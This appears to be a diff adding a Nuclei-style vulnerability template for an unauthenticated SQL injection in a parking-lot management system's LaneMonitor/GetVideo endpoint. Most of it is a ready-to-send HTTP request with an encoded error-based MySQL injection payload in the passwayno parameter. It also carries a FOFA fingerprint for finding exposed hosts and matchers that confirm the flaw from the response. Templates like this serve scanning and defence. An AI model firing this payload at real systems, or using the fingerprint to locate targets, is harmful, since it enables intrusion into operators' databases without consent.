@@ -1,0 +1,32 @@
+id: smartpark-GetVideo-sqli
+info:
+  name: 停车场后台管理系统 LaneMonitor/GetVideo - sqli
+  author: leadlife
+  severity: high
+  description: 停车场后台管理系统 LaneMonitor/GetVideo 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%81%9C%E8%BD%A6%E5%9C%BA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%81%9C%E8%BD%A6%E5%9C%BA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetVideo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="938984120"
+  tags: 2025,smartpark,sqli
+
+http:
+  - raw:
+      - |
+        GET /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qbzxq1qvxkq')
+        condition: and
